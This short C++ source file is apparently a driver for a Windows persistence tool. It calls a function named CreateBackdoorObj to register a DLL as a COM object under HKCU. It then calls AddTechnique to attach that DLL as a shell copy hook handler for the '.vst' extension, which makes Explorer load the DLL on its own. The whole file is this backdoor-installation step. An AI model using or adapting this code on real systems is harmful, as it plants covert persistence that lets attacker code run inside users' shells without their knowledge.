#include "reg.h"



int wmain()
{

	std::wstring dllPath = L"C:\\Users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\ATLCopyHookHandler.dll";
	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
	std::wstring ext = L".vst";
	reg::AddTechnique(COPY_HOOK_HANDLER, (WCHAR *)ext.c_str(), guid);

}
